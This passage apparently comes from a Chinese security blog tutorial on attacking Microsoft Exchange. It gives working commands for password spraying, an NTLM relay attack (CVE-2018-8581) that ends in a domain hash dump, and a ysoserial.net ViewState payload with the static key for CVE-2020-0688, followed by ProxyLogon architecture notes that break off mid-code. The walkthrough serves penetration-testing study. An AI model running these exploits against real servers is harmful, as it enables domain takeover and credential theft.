<p>mailsniper 提供分别针对 <code>OWA</code> 接口、<code>EWS</code> 接口和 <code>ActiveSync</code> 接口的 password spray。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-PasswordSprayEWS</span> <span class="n">-ExchHostname</span> <span class="n">exchange</span><span class="p">.</span><span class="py">pentest</span><span class="p">.</span><span class="py">lab</span> <span class="n">-UserList</span> <span class="p">.\</span><span class="n">user</span><span class="p">.</span><span class="py">txt</span> <span class="n">-Password</span> <span class="mf">123456</span> <span class="n">-ExchangeVersion</span> <span class="n">Exchange2016</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161601869.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161601869.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161601869.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161601869.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161601869.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110161601869.png-water_print" /></p>
<h2 id="5-利用-exchange-接管域控">5 利用 Exchange 接管域控</h2>
<h3 id="51-cve-2018-8581-ssrf-漏洞">5.1 CVE-2018-8581 SSRF 漏洞</h3>
<h4 id="511-漏洞描述">5.1.1 漏洞描述</h4>
<p>Exchange 允许任意用户通过 EWS 接口来创建一个推送订阅（Push Subscription），并可以指定任意 URL 作为通知推送的目的地； 当触发推送时，Exchange 使用了 <code>CredentialCache</code> 类的 <code>DefaultCredentials</code> 属性，当使用 <code>DefaultCredentials</code> 时发出的 HTTP 请求将使用该权限发起 <code>NTLM</code> 认证； 在 EWS 请求中，通过在 Header 中使用 <code>SerializedSecurityContext</code>，指定 SID 可以实现身份伪装，从而以指定用户身份进行 EWS 调用操作。</p>
<p>即从 HTTP relay 到 LDAP 的 NTLM Relay 攻击。</p>
<h4 id="512-受影响的系统版本">5.1.2 受影响的系统版本</h4>
<ul>
<li>Exchange Server 2010 ~ Exchange Server 2016</li>
</ul>
<h4 id="513-漏洞复现">5.1.3 漏洞复现</h4>
<p>漏洞利用到两个工具：</p>
<ul>
<li><a href="https://github.com/SecureAuthCorp/impacket/" target="_blank" rel="noopener noreffer">impacket</a></li>
<li><a href="https://github.com/dirkjanm/PrivExchange" target="_blank" rel="noopener noreffer">PrivExchange</a></li>
</ul>
<p>首先在本机启动 NTLM 中继，进入到 <code>impacket</code> 的  <code>examples</code> 目录执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 ntlmrelayx.py -t ldap://pentest.lab --escalate-user hacker
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>pentest.lab</code> 是域的名称</p>
<p><code>--escalate-user</code> 的参数是 Exchange 的普通权限用户名。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 privexchange.py -ah 172.16.147.1 172.16.147.4 -u hacker -p <span class="s2">&#34;hack123aB&#34;</span> -d pentest.lab
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>-ah</code> 参数指定攻击者 IP，在这里为 <code>172.16.147.1</code></p>
<p><code>172.16.147.4</code> 为 Exchange 服务器在域的名称或者IP地址 <code>-u</code> 指定需要提权的 Exchange 的普通权限用户名 <code>-p</code>指定 Exchange 的普通权限用户的密码 <code>-d</code> 指定域的名称</p>
<p>导出域内 hash：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 secretsdump.py pentest.lab/hacker@pentest.lab -just-dc
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="52-cve-2020-0688-反序列化漏洞">5.2 CVE-2020-0688 反序列化漏洞</h3>
<h4 id="521-漏洞描述">5.2.1 漏洞描述</h4>
<p>与正常软件安装每次都会产生随机密钥不同，所有 Exchange Server 在安装后的 web.config 文件中都拥有相同的 validationKey 和 decryptionKey。这些密钥用于保证 ViewState 的安全性。</p>
<p>而 ViewState 是 ASP.NET Web 应用以序列化格式存储在客户机上的服务端数据。客户端通过 <code>__VIEWSTATE</code> 请求参数将这些数据返回给服务器。攻击者可以在 Exchange Control Panel web 应用上执行任意 .net 代码。</p>
<p>当攻击者通过各种手段获得一个可以访问 Exchange Control Panel （ECP）组件的用户账号密码时。攻击者可以在被攻击的 exchange 上执行任意代码，直接获取服务器权限。</p>
<p>具体原理可以参考：<a href="https://www.zcgonvh.com/zb_users/upload/2020/03/202003011583061708182069.pdf" target="_blank" rel="noopener noreffer">CVE-2020-0688的武器化与.net反序列化漏洞那些事</a></p>
<h4 id="522-受影响的系统版本">5.2.2 受影响的系统版本</h4>
<ul>
<li>Microsoft Exchange Server 2010 Service Pack 3</li>
<li>Microsoft Exchange Server 2013</li>
<li>Microsoft Exchange Server 2016</li>
<li>Microsoft Exchange Server 2019</li>
</ul>
<h4 id="523-漏洞复现">5.2.3 漏洞复现</h4>
<h5 id="5231-前提">5.2.3.1 前提</h5>
<p>首先，需要获取 4 个参数：</p>
<ul>
<li>validationkey 该参数为默认，为漏洞产生的原因
<ul>
<li>CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</li>
</ul>
</li>
<li>validationalg 默认
<ul>
<li>SHA1</li>
</ul>
</li>
<li>generator</li>
<li>viewstateuserkey</li>
</ul>
<p>在这四个变量中，前两个为默认固定，viewstateuserkey 和 generator 的值需要从经过身份验证的 session 中收集。<code>viewstateuserkey</code> 可以从 ASP.NE T的 <code>_SessionID cookie</code> 中获取，而 <code>generator</code> 可以在一个隐藏字段 <code>__VIEWSTATEGENERATOR</code> 中找到。</p>
<h5 id="5232-参数获取">5.2.3.2 参数获取</h5>
<p>在正常登录后访问 <code>/ecp/default.aspx</code> 页面。使用 burpsuite 抓包发 repeater，找到登录时 <code>/ecp/default.aspx</code> 的原始响应。</p>
<p>找到 <code>ASP.NET_SessionId</code> 的 <code>cookie</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ASP.NET_SessionId=d7d6614a-4959-4989-a3d1-27e6efd8875d
</span></span></code></pre></td></tr></table>
</div>
</div><p>搜索 <code>__VIEWSTATEGENERATOR</code> 获取字段值：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">B97B4E27
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171911990.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171911990.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171911990.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171911990.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171911990.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171911990.png-water_print" /></p>
<h5 id="5233-生成-payload">5.2.3.3 生成 payload</h5>
<p>需要用到 <a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener noreffer">ysoserial.net</a></p>
<ul>
<li>生成执行程序的 payload</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="s2">&#34;calc.exe&#34;</span> --validationalg<span class="o">=</span><span class="s2">&#34;SHA1&#34;</span> --validationkey<span class="o">=</span><span class="s2">&#34;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&#34;</span> --generator<span class="o">=</span><span class="s2">&#34;B97B4E27&#34;</span> --viewstateuserkey<span class="o">=</span><span class="s2">&#34;d7d6614a-4959-4989-a3d1-27e6efd8875d&#34;</span> --isdebug --islegacy
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/wEylAcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC2BTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LSXUwoXG5VzeGJVCJLwnNz8xsRfw=
</span></span></code></pre></td></tr></table>
</div>
</div><p>生成完 payload 代码后，需要对该代码中的特殊字符进行 URL Encode 编码构造一个 URL：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/ecp/default.aspx?__VIEWSTATEGENERATOR=&lt;generator&gt;&amp;__VIEWSTATE=&lt;ViewState&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>将最开始获得的 <code>__VIEWSTATEGENERATOR</code> 值替换 generator，将 URL Encode 编码后的 payload 替换 ViewState。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917764.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917764.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917764.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917764.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917764.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917764.png-water_print" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917751.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917751.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917751.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917751.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917751.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171917751.png-water_print" /></p>
<ul>
<li>生成写文件的 payload</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="s2">&#34;cmd /c echo POC &gt; C:\1.txt&#34;</span> --validationalg<span class="o">=</span><span class="s2">&#34;SHA1&#34;</span> --validationkey<span class="o">=</span><span class="s2">&#34;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&#34;</span> --generator<span class="o">=</span><span class="s2">&#34;B97B4E27&#34;</span> --viewstateuserkey<span class="o">=</span><span class="s2">&#34;80677c59-fde2-4534-b8ae-97f3997b009a&#34;</span> --isdebug --islegacy
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="53-proxylogon">5.3 ProxyLogon</h3>
<h4 id="531-漏洞描述">5.3.1 漏洞描述</h4>
<p>ProxyLogon 是 CVE-2021-26855 和 CVE-2021-27065 两个漏洞的组合利用。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171528222.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171528222.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171528222.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171528222.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171528222.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171528222.png-water_print" /></p>
<p>Exchange 是一个非常复杂的应用程序。 自 2000 年以来，Exchange 每 3 年发布一个新版本。 每当 Exchange 发布新版本时，体系结构都会发生很大变化并变得不同。架构和迭代的变化使得升级 Exchange Server 变得困难。 为了保证新旧架构之间的兼容性，Exchange Server 导致存在了新的攻击面。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171532178.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171532178.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171532178.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171532178.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171532178.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171532178.png-water_print" /></p>
<p>在 Microsoft Exchange 上重点关注于客户端访问服务 Client Access Service(CAS)。 CAS 是 Exchange 的基本组件。在 Exchange 2000/2003 版本，CAS 是一个独立的 Frontend Server，负责所有 Frontend Web 的逻辑。 经过多次重命名、集成和版本差异，CAS 已成为 Mail Role 下的组件。</p>
<h5 id="5311-cas-架构">5.3.1.1 CAS 架构</h5>
<p>CAS 是负责接受来自客户端的所有连接的基本组件，包括 HTTP、POP3、IMAP 还是 SMTP，并将连接代理到相应的后端服务。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171535005.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171535005.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171535005.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171535005.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171535005.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171535005.png-water_print" /></p>
<p>CAS 网站搭建在 Microsoft IIS 上。IIS 中有两个站点。「Default Website」是之前提到的前端，「Exchange Backend」是负责处理业务逻辑。查看配置后可以发现，Frontend 绑定了 80 和 443 端口，Exchange Backend 监听了 81 和 444 端口。所有端口都绑定了 0.0.0.0，这意味着可以访问 Frontend 和 Backend。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171540906.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171540906.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171540906.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171540906.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171540906.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171540906.png-water_print" /></p>
<p>Exchange 系统的服务架构如下图所示，由前端和多个后端组件组成。⽤户基于各类协议对 Exchange 的前端发起请求，前端解析请求后会将其转发到后端相对应的服务当中。以基于 HTTP/HTTPS 协议的访问为例，来⾃ Outlook 或 Web 客户端的请求会⾸先经过 IIS，然后进⼊到 Exchange 的 HTTP 代理，代理根据请求类型将 HTTP 请求转发到不同的后端组件中。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171542985.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171542985.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171542985.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171542985.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171542985.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171542985.png-water_print" /></p>
<h5 id="5312-frontend-proxy">5.3.1.2 Frontend Proxy</h5>
<p>Frontend Proxy 模块根据当前的 <code>ApplicationPath</code> 选择处理程序来处理来自客户端的 HTTP 请求。 比如访问 <code>/EWS</code> 会使用 <code>EwsProxyRequestHandler</code>，而 /OWA 会触发 <code>OwaProxyRequestHandler</code>。 Exchange 中的所有处理程序都继承了 <code>ProxyRequestHandler</code> 类，并实现了它的核心逻辑，包括：如何处理来自用户的 HTTP 请求，从 Backend 到代理的 URL，以及如何与 Backend 同步信息。该类也是整个 Proxy Module 中最核心的部分，将 ProxyRequestHandler 分成 3 个部分：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171546879.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171546879.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171546879.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171546879.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171546879.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171546879.png-water_print" /></p>
<ul>
<li>Request Section</li>
</ul>
<p><code>Request Section</code> 解析来自客户端的 HTTP 请求并确定哪些 cookie 和标头可以代理到后端。Frontend 和 Backend 依靠 HTTP Headers 来同步信息和代理内部状态。因此，Exchange 定义了一个黑名单，以避免某些内部 Headers 被滥用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="k">virtual</span> <span class="kt">bool</span> <span class="n">ShouldCopyHeaderToServerRequest</span><span class="p">(</span><span class="kt">string</span> <span class="n">headerName</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">headerName</span><span class="p">,</span> <span class="s">&#34;X-CommonAccessToken&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">headerName</span><span class="p">,</span> <span class="s">&#34;X-IsFromCafe&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">headerName</span><span class="p">,</span> <span class="s">&#34;X-SourceCafeServer&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">headerName</span><span class="p">,</span> <span class="s">&#34;msExchProxyUri&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">headerName</span><span class="p">,</span> <span class="s">&#34;X-MSExchangeActivityCtx&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">headerName</span><span class="p">,</span> <span class="s">&#34;return-client-request-id&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">Equals</span><span class="p">(</span><span class="n">headerName</span><span class="p">,</span> <span class="s">&#34;X-Forwarded-For&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">&amp;&amp;</span> <span class="p">(!</span><span class="n">headerName</span><span class="p">.</span><span class="n">StartsWith</span><span class="p">(</span><span class="s">&#34;X-Backend-Diag-&#34;</span><span class="p">,</span> <span class="n">OrdinalIgnoreCase</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">      <span class="p">||</span> <span class="k">this</span><span class="p">.</span><span class="n">ClientRequest</span><span class="p">.</span><span class="n">GetHttpRequestBase</span><span class="p">().</span><span class="n">IsProbeRequest</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 Request 的最后阶段，Proxy Module 会调用 handler 实现的 <code>AddProtocolSpecificHeadersToServerRequest</code> 方法，在 HTTP 头中添加要与 Backend 交换的信息。这一阶段还会将当前登录用户的信息序列化，放到一个新的 HTTP 头 <code>X-CommonAccessToken</code> 中，再转发给 Backend。</p>
<ul>
<li>Proxy Section</li>
</ul>
<p>Proxy Section 首先使用 <code>GetTargetBackendServerURL</code> 方法来计算应将 HTTP 请求转发到哪个后端 URL。 然后使用 <code>CreateServerRequest</code> 方法初始化一个新的 HTTP 客户端请求。</p>
<p><strong>HttpProxy\ProxyRequestHandler.cs</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="n">HttpWebRequest</span> <span class="n">CreateServerRequest</span><span class="p">(</span><span class="n">Uri</span> <span class="n">targetUrl</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HttpWebRequest</span> <span class="n">httpWebRequest</span> <span class="p">=</span> <span class="p">(</span><span class="n">HttpWebRequest</span><span class="p">)</span><span class="n">WebRequest</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">targetUrl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(!</span><span class="n">HttpProxySettings</span><span class="p">.</span><span class="n">UseDefaultWebProxy</span><span class="p">.</span><span class="n">Value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">httpWebRequest</span><span class="p">.</span><span class="n">Proxy</span> <span class="p">=</span> <span class="n">NullWebProxy</span><span class="p">.</span><span class="n">Instance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">httpWebRequest</span><span class="p">.</span><span class="n">ServicePoint</span><span class="p">.</span><span class="n">ConnectionLimit</span> <span class="p">=</span> <span class="n">HttpProxySettings</span><span class="p">.</span><span class="n">ServicePointConnectionLimit</span><span class="p">.</span><span class="n">Value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">httpWebRequest</span><span class="p">.</span><span class="n">Method</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">ClientRequest</span><span class="p">.</span><span class="n">HttpMethod</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">httpWebRequest</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">&#34;X-FE-ClientIP&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">ClientEndpointResolver</span><span class="p">.</span><span class="n">GetClientIP</span><span class="p">(</span><span class="n">SharedHttpContextWrapper</span><span class="p">.</span><span class="n">GetWrapper</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">httpWebRequest</span><span class="p">.</span><span class="n">Headers</span><span class="p">[</span><span class="s">&#34;X-Forwarded-For&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">ClientEndpointResolver</span><span class="p">.</span><span class="n">GetClientProxyChainIPs</span><span class="p">(</span><span class="n">SharedHttpContextWrapper</span><span class="p">.</span><span class="n">GetWrapper</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">HttpContext</span><span class="p">));</span>
